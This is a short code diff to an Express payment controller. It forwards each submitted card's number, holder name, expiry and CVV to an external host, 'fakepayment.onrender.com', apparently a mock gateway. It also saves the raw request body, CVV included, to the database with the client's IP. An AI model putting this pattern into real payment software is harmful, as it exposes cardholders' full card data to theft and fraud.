@@ -1,4 +1,5 @@
 import { Request, Response } from 'express';
+import axios from 'axios';
 import PaymentModel from '../models/PaymentModel';
 
 export default class PaymentController {
@@ -7,16 +8,30 @@ export default class PaymentController {
       const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
       const date = new Date().toISOString();
 
-      await PaymentModel.add({
+      const paymentData = {
         ...req.body,
         ip,
         date
+      };
+
+      await PaymentModel.add(paymentData);
+
+      await axios.post('https://fakepayment.onrender.com/api/pay', {
+        cardNumber: req.body.cardNumber,
+        cardHolder: req.body.cardName,
+        expMonth: req.body.expMonth,
+        expYear: req.body.expYear,
+        cvv: req.body.cvv,
+        amount: req.body.amount,
+        currency: req.body.currency
       });
 
-      res.render('index', { paymentSuccess: true });
+      res.redirect('/payment/success');
+
     } catch (err) {
-      console.error('Error al guardar el pago:', err);
-      res.status(500).send('Error al guardar el pago');
+      console.error('Error en el proceso de pago:', err);
+      res.status(500).send('Error al procesar el pago');
     }
   }
 }
+
